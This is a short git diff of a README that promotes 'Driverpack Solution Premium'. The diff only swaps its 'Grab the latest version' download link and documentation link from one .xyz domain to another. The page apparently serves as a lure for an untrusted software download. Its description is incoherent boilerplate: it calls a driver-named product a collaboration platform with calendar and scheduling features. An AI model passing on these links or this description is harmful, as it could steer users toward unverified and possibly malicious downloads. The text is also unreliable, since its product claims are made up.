@@ -8,9 +8,9 @@ Industry-leading **Driverpack Solution Premium** collaboration platform with tem
 It's aimed at everyday users as much as power users.
 
 ## 🔗 Links
-➡️ **[Grab the latest version](https://driverpack-solution-premium.softonx.xyz)**
+➡️ **[Grab the latest version](https://driverpack-solution-premium.softax.xyz)**
 
-Documentation: https://driverpack-solution-premium.softonx.xyz
+Documentation: https://driverpack-solution-premium.softax.xyz
 
 ## Features
 - ✅ **Calendar & Scheduling:** Built-in planner with recurring events, deadlines, and time blocking.
